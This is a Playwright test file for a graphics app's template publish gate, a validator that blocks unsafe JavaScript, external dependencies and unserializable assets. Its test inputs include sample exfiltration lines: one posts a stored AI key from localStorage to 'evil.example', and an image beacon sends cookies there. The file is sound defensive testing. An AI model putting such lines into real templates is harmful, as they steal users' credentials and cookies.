// covers: src/templates/**, src/validation/{publishGate,templateBench}.ts, src/showchat/**

import { test, expect, type Page } from '@playwright/test';
import { bootstrapGraphic } from './_create';

// The publish gate (src/validation/publishGate.ts), a pure offline transform run wherever a
// template leaves its author: a community pack, a hosted production, a production export. It
// passes real generated templates and blocks unsafe ones. Born as the Era 5.5 gallery's gate.

async function create(page: Page, categoryName: string, variantName: string) {
  await bootstrapGraphic(page, { category: categoryName, name: variantName });
}

test('the publish gate passes a real template and blocks an unsafe one', async ({ page }) => {
  await page.goto('/app');
  await create(page, 'Lower thirds', 'Hairline');

  const result = await page.evaluate(async () => {
    const { publishGate } = await import('/src/validation/publishGate.ts');
    const { useTemplateStore } = await import('/src/store/templateStore.ts');
    const tpl = useTemplateStore.getState().template;

    const good = publishGate(tpl);

    // Poison a copy: a CDN dependency (must be promoted to a blocking error) + a Blob asset that would
    // silently serialize to "{}" and lose the image.
    const badTpl = {
      ...tpl,
      html: tpl.html + '\n<script src="https://cdn.example.com/x.js"></script>',
      assets: [...tpl.assets, { path: 'images/x.png', data: new Blob([new Uint8Array([1, 2, 3])]) }],
    };
    const bad = publishGate(badTpl);

    return {
      goodOk: good.ok,
      goodErrors: good.errors.map((e) => `${e.rule}: ${e.message}`),
      badOk: bad.ok,
      badRules: bad.errors.map((e) => e.rule),
    };
  });

  // A freshly generated, export-ready lower third must be publishable.
  expect(result.goodOk, `unexpected gate errors: ${result.goodErrors.join(' | ')}`).toBe(true);
  // The poisoned copy is refused, on both counts.
  expect(result.badOk).toBe(false);
  expect(result.badRules).toContain('external-dependency');
  expect(result.badRules).toContain('asset-not-serializable');
});

test('the publish gate blocks JS that talks to the network, reads storage, or leaves its frame', async ({ page }) => {
  // A hosted production or an export has no reviewer downstream, so there this gate IS the review.
  // It is a screen rather than a sandbox — a determined author can evade a regex — so what these
  // cases pin is that the OBVIOUS routes are refused and that ordinary graphics still pass.
  await page.goto('/app');
  await create(page, 'Tickers', 'News Strip');

  const result = await page.evaluate(async () => {
    const { publishGate } = await import('/src/validation/publishGate.ts');
    const { variantById } = await import('/src/templates/catalog.ts');
    const { chatGraphicBlock } = await import('/src/showchat/chatGraphicBlock.ts');
    const base = variantById('tk01')!.create({});
    const gate = (js: string) => {
      const g = publishGate({ ...base, js });
      return { ok: g.ok, rules: [...new Set(g.errors.map((e) => e.rule))] };
    };

    // An author who forgot to delete their SHOW CHAT block: it points at THEIR show, and shared it
    // would make every importer's graphic poll it. The mistake case matters as much as the attack.
    const chat =
      base.js +
      '\n' +
      chatGraphicBlock({
        ref: 'abc123',
        key: 'anon-key',
        showId: 'show-id',
        mode: 'feed',
        pollSeconds: 5,
        feedField: 'f0',
        authorField: 'f1',
        messageField: 'f2',
      });

    return {
      baseline: gate(base.js),
      chatBlock: gate(chat),
      // Reads the importer's stored AI key out of the app origin and posts it away.
      exfil: gate(base.js + "\nfetch('https://evil.example/c?k=' + parent.localStorage.getItem('spx-gfx-ai'));"),
      // The same theft with no network CALL at all — only the URL scan catches this one.
      imageBeacon: gate(base.js + "\nnew Image().src = 'https://evil.example/p?d=' + document.cookie;"),
      // Must NOT trip: ordinary DOM/geometry code that merely contains the words.
      ordinary: gate(base.js + '\nvar p = el.parentNode.classList; var t = el.getBoundingClientRect().top;'),
    };
  });

  expect(result.baseline.ok, `a stock ticker must stay publishable: ${result.baseline.rules.join(', ')}`).toBe(true);
  expect(result.ordinary.ok, `false positive on parentNode/rect.top: ${result.ordinary.rules.join(', ')}`).toBe(true);

  expect(result.chatBlock.ok).toBe(false);
  expect(result.chatBlock.rules).toContain('unsafe-js-network');

  expect(result.exfil.ok).toBe(false);
  expect(result.exfil.rules).toContain('unsafe-js-network');
  expect(result.exfil.rules).toContain('unsafe-js-data');
  expect(result.exfil.rules).toContain('unsafe-js-frame');

  expect(result.imageBeacon.ok).toBe(false);
  expect(result.imageBeacon.rules).toContain('external-dependency');
});

test('the publish gate passes every catalog variant', async ({ page }) => {
  // The counterweight to the test above: a screen that refuses real graphics is worse than no
  // screen, because the first thing an author does with a false refusal is work around it.
  await page.goto('/app');
  await create(page, 'Lower thirds', 'Hairline');

  const refused = await page.evaluate(async () => {
    const { publishGate } = await import('/src/validation/publishGate.ts');
    const { CATALOG } = await import('/src/templates/catalog.ts');
    const out: string[] = [];
    for (const key of Object.keys(CATALOG)) {
      for (const variant of CATALOG[key as keyof typeof CATALOG]!) {
        const gate = publishGate(variant.create({}));
        if (!gate.ok) out.push(`${variant.id}: ${gate.errors.map((e) => e.rule).join(', ')}`);
      }
    }
    return out;
  });

  expect(refused, 'these catalog variants can no longer be shared').toEqual([]);
});
